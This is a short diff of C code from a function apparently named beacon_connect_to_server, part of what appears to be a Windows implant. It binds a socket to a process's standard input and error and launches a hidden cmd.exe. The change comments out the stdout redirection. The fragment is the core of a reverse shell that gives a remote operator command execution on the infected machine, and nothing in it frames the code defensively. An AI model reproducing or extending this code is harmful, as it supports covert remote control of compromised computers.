@@ -96,7 +96,7 @@ void beacon_connect_to_server(char IP[16], int PORT){
     sinfo.cb = sizeof(sinfo);
     sinfo.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
     sinfo.hStdInput = (HANDLE)s;
-    sinfo.hStdOutput = (HANDLE)s;
+    //sinfo.hStdOutput = (HANDLE)s;
     sinfo.hStdError = (HANDLE)s;
     PROCESS_INFORMATION pinfo;
     CreateProcessA(NULL, "cmd.exe", NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &sinfo, &pinfo);
